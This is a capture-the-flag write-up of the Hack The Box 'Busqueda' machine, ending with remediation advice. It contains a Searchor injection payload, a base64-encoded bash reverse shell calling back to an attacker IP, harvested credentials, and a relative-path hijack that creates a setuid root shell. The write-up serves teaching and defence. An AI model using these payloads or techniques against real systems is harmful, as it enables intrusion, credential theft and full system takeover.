---
title: "Hack The Box: Busqueda"
date: 2026-08-29
summary: "An Easy Linux-based machine where the target is compromised by exploiting a remote code execution vulnerability (CVE-2023-43364) in Searchor 2.4.0 for initial access as the svc user. Enumerating internal Git configuration reveals cleartext credentials, enabling SSH access and Gitea authentication. Privilege escalation is achieved by abusing sudo permissions on a custom system checkup script to inspect Docker container configurations for Gitea administrator credentials, accessing a private script repository, and exploiting a relative path vulnerability to execute a malicious script as root."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Linux"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Busqueda"
tags:
  - cve-2023-43364
  - docker
  - easy
  - git-credentials
  - gitea
  - htb
  - linux
  - nmap
  - rce
  - relative-path-hijack
  - reverse-shell
  - searchor
  - sudo-abuse
---

# Executive Summary

An unauthenticated remote code execution vulnerability (CVE-2023-43364) in the third-party Searchor 2.4.0 library allowed initial access to the host `searcher.htb` as a low-privileged service user. Subsequent internal reconnaissance identified hardcoded credentials within local Git metadata, leading to lateral credential reuse across system accounts and access to an internal Gitea service. By leveraging overly permissive `sudo` rights on a custom administrative script, database container inspection privileges were abused to extract administrator credentials, inspect private source repositories, and exploit a relative path traversal flaw in an administrative checkup script, ultimately resulting in full root compromise of the server.

# Contextual Details

Attacker IP: `10.10.15.8`

Target IP: `10.129.50.252`

# Recon

## Nmap Scan

```bash
$ nmap -sCV -vv -oN nmap/top-tcp.nmap 10.129.50.252
Nmap scan report for 10.129.50.252
Host is up, received syn-ack (0.17s latency).
Scanned at 2026-08-27 02:33:56 EDT for 31s
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE REASON      VERSION
22/tcp   open     ssh     syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp   open     http    syn-ack     Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
5190/tcp filtered aol     no-response
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 27 02:34:27 2026 -- 1 IP address (1 host up) scanned in 31.36 seconds
```

SSH and HTTP are active, which is expected for a Linux target.

Also port 5190 is running, which is the default port for America Online (AOL) services.

Let’s add the identified domain `searcher.htb` to `/etc/hosts` before moving any further:

```bash
$ echo '10.129.50.252 searcher.htb' | sudo tee -a /etc/hosts
10.129.50.252 searcher.htb
```

## Enumerating HTTP

Let’s visit the web application to check what is hosts:

![Figure 1](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-1.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

It hosts a searching server that is used to search across different types of search engines from a centralized platform.

Let’s try it out with a search engine, such as `youtube`:

![Figure 2](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-2.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

![Figure 3](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-3.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

It also allows auto redirection:

![Figure 4](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-4.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

# Exploitation

## CVE-2023-43364

At the footer of the website, it is clearly mentioned that the website uses `Searchor v2.4.0`:

![Figure 5](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-5.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

Which, after a quick search, is discovered to be suffering from a critical RCE vulnerability:

![Figure 6](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-6.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

According to Gemini, the following PoC could be used to gain RCE if it was submitted to the `query` field:

```bash
')+str(__import__('os').system('your_command_here'))#
```

Let’s try it out:

![Figure 7](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-7.png)

<figcaption class="blog-image-caption">Figure 7</figcaption>

![Figure 8](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-8.png)

<figcaption class="blog-image-caption">Figure 8</figcaption>

Very interesting. Successful RCE.

Let’s turn it into a reverse shell. I will be using this shell from [revshells.com](https://revshells.com), and base64 encode it:

![Figure 9](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-9.png)

<figcaption class="blog-image-caption">Figure 9</figcaption>

This is the final payload:

```bash
')+str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44LzQ0NDQgMD4mMQ== | base64 -d | bash'))#
```

Firing it after running a `nc` listener, a reverse shell is successfully landed:

```bash
$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.50.252 39508
bash: cannot set terminal process group (1513): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
whoami
svc
```

User flag can be found in `/home/svc/user.txt`.

# Privilege Escalation

## Identifying Credentials and a New Vhost

Searching the local directory, there is a hidden git directory:

```bash
svc@busqueda:/var/www/app$ ls -la
ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Aug 28 11:58 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

By enumerating the directory, a `config` file is identified to hold a pair of credentials and a vhost:

```bash
svc@busqueda:/var/www/app/.git$ ls -la
ls -la
total 52
drwxr-xr-x 8 www-data www-data 4096 Aug 28 11:58 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3  2023 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs

svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

There is a complex password that appears to belong to the user `cody`, and a vhost `gitea.searcher.htb`.

Let’s add the vhost to `/etc/hosts` on the attacker machine:

```bash
$ echo '10.129.50.252 gitea.searcher.htb' | sudo tee -a /etc/hosts
10.129.50.252 gitea.searcher.htb
```

Checking `/etc/passwd` shows no `cody` user on the target system:

```bash
svc@busqueda:/var/www/app/.git$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash
```

This means the password that was found is probably for the `svc` user to use over SSH. However, it's also possible that `cody` is a valid user on the Gitea service hosted there, and the credentials are for that. Or the password could work for both.

Let’s validate the SSH hypothesis:

```bash
$ ssh svc@searcher.htb
svc@searcher.htb's password:
<SNIP>
svc@busqueda:~$
```

And it indeed is correct. Now we have a more stable shell.

## `sudo -l`

Before enumerating the newly identified vhost, let’s perform basic privilege escalation tactics, including running `sudo -l`:

```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

There is a python script that can be ran as root.

Let’s check if we can read or write on this file:

```bash
svc@busqueda:~$ ls -l /opt/scripts/system-checkup.py
-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
```

Unfortunately, read and write permissions aren’t provided to our user.

## Gathering Administrator Credentials for Gitea

Let’s attempt to run it to understand its behavior:

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

It seems to be some kind of docker analyzer.

Let’s attempt to list running docker containers:

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

The `mysql_db` container seems interesting. Let’s inspect it (command syntax was provided by Gemini):

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq
<SNIP>
    "Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ]
<SNIP>
```

Many details are dumped, but most importantly a username and two passwords.

They appear to belong to mysql service, but let’s first try them against gitea user accounts in the newly discovered vhost:

![Figure 10](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-10.png)

<figcaption class="blog-image-caption">Figure 10</figcaption>

Let’s try the found passwords against the administrator account:

![Figure 11](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-11.png)

<figcaption class="blog-image-caption">Figure 11</figcaption>

## Exploiting a Vulnerable Script

The pair of credentials `administrator`:`yuiu1hoiu4i5ho1uh` authenticated me successfully, and there is a private administrator repository called `scripts`.

This repository seems to hold the scripts contents of all files related to the `system-checkup` file:

![Figure 12](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-12.png)

<figcaption class="blog-image-caption">Figure 12</figcaption>

The most important script to enumerate is the main script, `system-checkup.py`. It holds a critical vulnearbility:

![Figure 13](/assets/images/writeups/hack-the-box-busqueda/hack-the-box-busqueda-fig-13.png)

<figcaption class="blog-image-caption">Figure 13</figcaption>

When the script is provided with the `full-checkup` argument, it calls the above `else` logic. However, notice that this logic calls the `full-checkup.sh` file from the current directory, not from an absolute directory.

This means any file named `full-checkup.sh` in the current working directory will be executed, even if it is malicious.

So let’s create a malicious shell file with the same name in `/tmp` and configure it to generate a privileged `bash` binary. Ensure to be in the `/tmp` directory before running the python command:

```bash
svc@busqueda:~$ cd /tmp
svc@busqueda:/tmp$ echo '#!/bin/bash' > full-checkup.sh
svc@busqueda:/tmp$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> full-checkup.sh
svc@busqueda:/tmp$ chmod +x full-checkup.sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```

Now let’s execute the rouge bash binary to gain root:

```bash
svc@busqueda:/tmp$ /tmp/rootbash -p
rootbash-5.1# whoami
root
```

Root flag can be found in `/root/root.txt`.

---

# Business Impact

## Confidentiality

Attackers can access all hosted databases, proprietary source code repositories on Gitea, sensitive configuration files, internal system credentials, and all resident OS files (including root-level secrets).

## Integrity

With root-level access and write access to the underlying infrastructure and source repositories, an attacker can modify system configurations, alter application source code, deploy malicious persistence mechanisms, or tamper with system logs.

## Availability

Unrestricted administrative access enables attackers to terminate running Docker containers, corrupt database instances, take down the web application, or render the underlying operating system entirely inoperable.

# Remediation

- **Patch Third-Party Software:** Upgrade the `Searchor` Python library to a secure, patched version (v2.4.2 or later) or sanitize all user input before evaluation to mitigate arbitrary command injection (CVE-2023-43364).
- **Remove Stored Credentials & Address Re-use:** Purge sensitive plaintext credentials and tokens from Git commit histories, configuration files (`.git/config`), and static environment files; enforce unique, complex passwords across distinct services and user accounts.
- **Harden Sudo Rules & Script Permissions:** Restrict `sudo` access by avoiding wildcards (`*`) in `/etc/sudoers` definitions. Ensure automated management scripts only accept strictly validated input flags rather than arbitrary sub-arguments.
- **Enforce Absolute Paths in Administrative Scripts:** Update `/opt/scripts/system-checkup.py` to reference all external executables and helper scripts using absolute paths (e.g., `/opt/scripts/full-checkup.sh`) to eliminate relative path execution attacks.
- **Secure Container Secrets:** Avoid storing sensitive database root credentials in plain text environment variables within container definitions; utilize Docker secrets or dedicated secret management solutions.
